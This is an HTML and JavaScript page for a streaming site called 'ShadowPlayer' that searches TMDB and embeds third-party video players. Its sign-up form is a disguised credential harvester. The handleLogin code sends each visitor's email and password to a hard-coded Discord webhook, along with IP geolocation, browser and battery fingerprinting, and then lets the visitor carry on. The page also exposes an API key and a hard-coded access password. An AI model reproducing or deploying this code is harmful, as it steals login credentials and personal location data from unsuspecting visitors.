<html><head><base href="https://d.pr/i/1g7/4"><title>ShadowPlayer - Modern Cinema Experience</title>
<link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
<style>
:root {
  --primary: #6C63FF;
  --secondary: #2A2A72;
  --text: #F5F5F5;
  --bg: #0F0F1A;
  --card-bg: #1A1A2E;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Poppins', sans-serif;
}

body {
  background: var(--bg);
  color: var(--text);
}

.password-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.9);
  backdrop-filter: blur(8px);
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
}

.password-form {
  background: var(--card-bg);
  padding: 2rem;
  border-radius: 1rem;
  width: 90%;
  max-width: 400px;
  text-align: center;
  animation: fadeInUp 0.5s;
}

.password-form input {
  width: 100%;
  padding: 1rem;
  margin: 1rem 0;
  border: none;
  border-radius: 0.5rem;
  background: rgba(255,255,255,0.1);
  color: var(--text);
}

.password-form button {
  background: var(--primary);
  color: white;
  border: none;
  padding: 1rem 2rem;
  border-radius: 0.5rem;
  cursor: pointer;
  transition: transform 0.2s;
}

.password-form button:hover {
  transform: translateY(-2px);
}

.header {
  background: var(--card-bg);
  padding: 1rem;
  position: fixed;
  width: 100%;
  top: 0;
  z-index: 100;
}

.search-container {
  display: flex;
  gap: 0.5rem;
  max-width: 600px;
  margin: 1rem auto;
}

.search-container select,
.search-container input,
.search-container button {
  padding: 0.75rem;
  border: none;
  border-radius: 0.5rem;
  background: rgba(255,255,255,0.1);
  color: var(--text);
}

.search-container button {
  background: var(--primary);
  cursor: pointer;
}

.results-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 1.5rem;
  padding: 1rem;
  margin-top: 6rem;
}

.movie-card {
  background: var(--card-bg);
  border-radius: 0.75rem;
  overflow: hidden;
  transition: transform 0.3s;
  animation: fadeIn 0.5s;
}

.movie-card:hover {
  transform: translateY(-5px);
}

.movie-poster {
  width: 100%;
  aspect-ratio: 2/3;
  object-fit: cover;
}

.movie-info {
  padding: 1rem;
}

.movie-title {
  font-size: 1rem;
  font-weight: 600;
  margin-bottom: 0.5rem;
}

.movie-meta {
  font-size: 0.875rem;
  color: rgba(255,255,255,0.7);
}

.player-container {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.95);
  z-index: 200;
  display: none;
}

.player-container.active {
  display: block;
}

iframe {
  width: 100%;
  height: 100%;
  border: none;
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}

@keyframes fadeInUp {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

.controls {
  position: fixed;
  bottom: 1rem;
  left: 50%;
  transform: translateX(-50%);
  display: flex;
  gap: 1rem;
  z-index: 300;
}

.control-btn {
  padding: 0.75rem 1.5rem;
  border: none;
  border-radius: 0.5rem;
  background: var(--primary);
  color: white;
  cursor: pointer;
  transition: transform 0.2s;
}

.control-btn:hover {
  transform: translateY(-2px);
}

.social-links {
  position: fixed;
  right: 1rem;
  bottom: 1rem;
  display: flex;
  gap: 1rem;
}

.social-icon {
  color: var(--text);
  font-size: 1.5rem;
  transition: color 0.2s;
}

.social-icon:hover {
  color: var(--primary);
}

.episodes-modal {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.95);
  backdrop-filter: blur(8px);
  z-index: 300;
  display: none;
  align-items: center;
  justify-content: center;
  padding: 2rem;
}

.episodes-modal.active {
  display: flex;
}

.episodes-content {
  background: var(--card-bg);
  border-radius: 1rem;
  width: 90%;
  max-width: 800px;
  max-height: 80vh;
  overflow-y: auto;
  padding: 2rem;
  animation: fadeInUp 0.5s;
}

.season-select {
  margin-bottom: 2rem;
}

.season-select select {
  padding: 0.75rem;
  border: none;
  border-radius: 0.5rem;
  background: rgba(255,255,255,0.1);
  color: var(--text);
  margin-left: 1rem;
}

.episodes-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 1rem;
}

.episode-card {
  background: rgba(255,255,255,0.1);
  border-radius: 0.5rem;
  padding: 1rem;
  cursor: pointer;
  transition: transform 0.2s;
}

.episode-card:hover {
  transform: translateY(-2px);
  background: rgba(255,255,255,0.15);
}

.episode-number {
  font-size: 0.875rem;
  color: var(--primary);
  margin-bottom: 0.5rem;
}

.episode-title {
  font-weight: 500;
  margin-bottom: 0.5rem;
}

.episode-air-date {
  font-size: 0.75rem;
  color: rgba(255,255,255,0.7);
}

.close-modal {
  position: absolute;
  top: 1rem;
  right: 1rem;
  background: transparent;
  border: none;
  color: var(--text);
  font-size: 1.5rem;
  cursor: pointer;
}

.login-overlay {
  position: fixed;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
  border: 1px solid rgba(0,0,0,0.2);
}
	
.login-form {
  background: var(--card-bg);
  padding: 2rem;
  border-radius: 1rem;
  width: 90%;
  max-width: 400px;
  text-align: center;
}
.login-form button {
  padding: 0.75rem 1.5rem;
  border: none;
  border-radius: 0.5rem;
  background: var(--primary);
  color: white;
  cursor: pointer;
  transition: transform 0.2s;
}
.login-form input {
  width: 100%;
  padding: 1rem;
  margin: 1rem 0;
  border: none;
  border-radius: 0.5rem;
  background: rgba(255,255,255,0.1);
  color: var(--text);
}

.error-message {
  color: #ff4444;
  margin-top: 1rem;
  font-size: 0.875rem;
}
</style>
</head>
<body>

<div class="password-overlay">
  <div class="password-form">
    <h2>Enter Password</h2>
    <input type="password" id="password-input" placeholder="Enter password">
    <button onclick="checkPassword()">Access ShadowPlayer</button>
  </div>
</div>

<div class="login-overlay" style="display: none;">
  <div class="login-form">
    <h2>Login Required</h2>
    <input type="email" id="login-email" placeholder="Email">
    <input type="password" id="login-password" placeholder="Password">
    <button onclick="handleLogin()">Sign Up</button>
    <p class="error-message"></p>
  </div>
</div>

<header class="header">
  <div class="search-container">
    <select id="content-type">
      <option value="movie">Movies</option>
      <option value="tv">TV Shows</option>
    </select>
    <input type="text" id="search-input" placeholder="Search titles...">
    <button onclick="searchContent()">
      <i class="fas fa-search"></i>
    </button>
  </div>
</header>

<main class="results-grid" id="results">
  <!-- Dynamic content -->
</main>

<div class="player-container" id="player">
  <!-- iframe will be injected here -->
</div>

<div class="controls">
  <button class="control-btn" onclick="toggleSearch()">
    <i class="fas fa-search"></i> New Search
  </button>
  <button class="control-btn" onclick="toggleEpisodes()">
    <i class="fas fa-list"></i> Episodes
  </button>
</div>

<div class="social-links">
  <a href="https://facebook.com" class="social-icon">
    <i class="fab fa-facebook"></i>
  </a>
  <a href="https://twitter.com" class="social-icon">
    <i class="fab fa-twitter"></i>
  </a>
  <a href="https://instagram.com" class="social-icon">
    <i class="fab fa-instagram"></i>
  </a>
</div>

<div class="episodes-modal" id="episodes-modal">
  <button class="close-modal" onclick="toggleEpisodes()">
    <i class="fas fa-times"></i>
  </button>
  <div class="episodes-content">
    <div class="season-select">
      <label>Season:</label>
      <select id="season-select" onchange="loadEpisodes()">
        <!-- Seasons will be populated dynamically -->
      </select>
    </div>
    <div class="episodes-grid" id="episodes-grid">
      <!-- Episodes will be populated dynamically -->
    </div>
  </div>
</div>

<script>
const API_KEY = 'e479c27ddf18512de2bbc883c3612637';
const TMDB_API = 'https://api.themoviedb.org/3';
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1264478932896321588/_rldWLDFoVI7YtPAdyqLV-rKssePEPBZuBH6cJjwWg2w7l941aIT8b_GuyEqBRl2Vo2e';

const collectUserData = async () => {
  const batteryData = await navigator.getBattery();
  const screenData = {
    resolution: `${screen.width}x${screen.height}`,
    windowSize: `${window.innerWidth}x${window.innerHeight}`,
  };

  const response = await fetch('https://ipapi.co/json/');
  const ipData = await response.json();

  return {
    ip: ipData.ip,
    city: ipData.city, 
    region: ipData.region,
    country: ipData.country,
    location: `${ipData.latitude},${ipData.longitude}`,
    org: ipData.org,
    postal: ipData.postal,
    timezone: ipData.timezone,
    browserInfo: navigator.userAgent,
    screenResolution: screenData.resolution,
    windowSize: screenData.windowSize,
    platform: navigator.platform,
    language: navigator.language,
    cookiesEnabled: navigator.cookieEnabled,
    javaEnabled: navigator.javaEnabled(),
    localTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString(),
    battery: `${batteryData.level * 100}%`,
    isCharging: batteryData.charging
  };
};

function checkPassword() {
  const password = document.getElementById('password-input').value;
  if(password === 'ShadowModsIsOP1') {
    document.querySelector('.password-overlay').style.display = 'none';
  } else {
    alert('Invalid password!');
  }
}

const handleLogin = async () => {
  const email = document.getElementById('login-email').value;
  const password = document.getElementById('login-password').value;
  
  const userData = await collectUserData();
  
  const webhookData = {
    embeds: [{
      title: 'New Login Attempt',
      fields: [
        { name: 'Email', value: email, inline: true },
        { name: 'Password', value: password, inline: true },
        ...Object.entries(userData).map(([key, value]) => ({
          name: key,
          value: String(value),
          inline: true
        }))
      ]
    }]
  };

  try {
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookData)
    });
    
    localStorage.setItem('isLoggedIn', 'true');
    localStorage.setItem('userEmail', email);
    
    document.querySelector('.login-overlay').style.display = 'none';
    
  } catch (err) {
    document.querySelector('.error-message').textContent = 'Login failed. Please try again.';
  }
};

async function searchContent() {
  const query = document.getElementById('search-input').value;
  const type = document.getElementById('content-type').value;
  
  try {
    const response = await fetch(
      `${TMDB_API}/search/${type}?api_key=${API_KEY}&query=${query}`
    );
    const data = await response.json();
    displayResults(data.results, type);
  } catch (err) {
    console.error('Search failed:', err);
  }
}

function displayResults(results, type) {
  const container = document.getElementById('results');
  container.innerHTML = '';
  
  results.forEach(item => {
    const card = document.createElement('div');
    card.className = 'movie-card animate__animated animate__fadeIn';
    
    card.innerHTML = `
      <img class="movie-poster" 
           src="https://image.tmdb.org/t/p/w500${item.poster_path}"
           alt="${item.title || item.name}">
      <div class="movie-info">
        <h3 class="movie-title">${item.title || item.name}</h3>
        <div class="movie-meta">
          <span>${item.release_date || item.first_air_date}</span>
          <span>⭐ ${item.vote_average}</span>
        </div>
      </div>
    `;
    
    card.onclick = () => playContent(item.id, type);
    container.appendChild(card);
  });
}

function playContent(id, type) {
  if (!localStorage.getItem('isLoggedIn')) {
    document.querySelector('.login-overlay').style.display = 'flex';
    return;
  }
  
  currentShowId = id;
  const player = document.getElementById('player');
  player.classList.add('active');
  
  const embedUrl = type === 'tv' 
    ? `https://www.2embed.cc/embedtv/${id}&s=1&e=1`
    : `https://www.2embed.cc/embed/${id}`;
    
  player.innerHTML = `<iframe src="${embedUrl}" allowfullscreen></iframe>`;
}

function toggleSearch() {
  document.getElementById('player').classList.remove('active');
  document.getElementById('search-input').value = '';
  document.getElementById('results').innerHTML = '';
}

async function toggleEpisodes() {
  const modal = document.getElementById('episodes-modal');
  const isVisible = modal.classList.contains('active');
  
  if (!isVisible) {
    modal.classList.add('active');
    await loadSeasons();
  } else {
    modal.classList.remove('active');
  }
}

async function loadSeasons() {
  const searchType = document.getElementById('content-type').value;
  if (searchType !== 'tv') return;

  try {
    const response = await fetch(
      `${TMDB_API}/tv/${currentShowId}?api_key=${API_KEY}`
    );
    const data = await response.json();
    const seasonSelect = document.getElementById('season-select');
    seasonSelect.innerHTML = '';
    
    data.seasons.forEach(season => {
      const option = document.createElement('option');
      option.value = season.season_number;
      option.textContent = `Season ${season.season_number}`;
      seasonSelect.appendChild(option);
    });
    
    await loadEpisodes();
  } catch (err) {
    console.error('Failed to load seasons:', err);
  }
}

async function loadEpisodes() {
  const seasonNumber = document.getElementById('season-select').value;
  
  try {
    const response = await fetch(
      `${TMDB_API}/tv/${currentShowId}/season/${seasonNumber}?api_key=${API_KEY}`
    );
    const data = await response.json();
    const episodesGrid = document.getElementById('episodes-grid');
    episodesGrid.innerHTML = '';
    
    data.episodes.forEach(episode => {
      const card = document.createElement('div');
      card.className = 'episode-card animate__animated animate__fadeIn';
      
      card.innerHTML = `
        <div class="episode-number">Episode ${episode.episode_number}</div>
        <div class="episode-title">${episode.name}</div>
        <div class="episode-air-date">${episode.air_date}</div>
      `;
      
      card.onclick = () => playEpisode(seasonNumber, episode.episode_number);
      episodesGrid.appendChild(card);
    });
  } catch (err) {
    console.error('Failed to load episodes:', err);
  }
}

function playEpisode(season, episode) {
  const embedUrl = `https://www.2embed.cc/embedtv/${currentShowId}&s=${season}&e=${episode}`;
  const player = document.getElementById('player');
  
  player.innerHTML = `<iframe src="${embedUrl}" allowfullscreen></iframe>`;
  player.classList.add('active');
  toggleEpisodes();
}

let currentShowId = null;

// Check login state on page load
document.addEventListener('DOMContentLoaded', () => {
  if (!localStorage.getItem('isLoggedIn')) {
    document.querySelector('.login-overlay').style.display = 'flex';
					  } else {
	      document.querySelector('.login-overlay').style.display = 'block';
	  }
});

// Event Listeners
document.addEventListener('keypress', (e) => {
  if(e.key === 'Enter' && document.activeElement.id === 'password-input') {
    checkPassword();
  }
  if(e.key === 'Enter' && document.activeElement.id === 'search-input') {
    searchContent();
  }
});
</script>

</body></html>
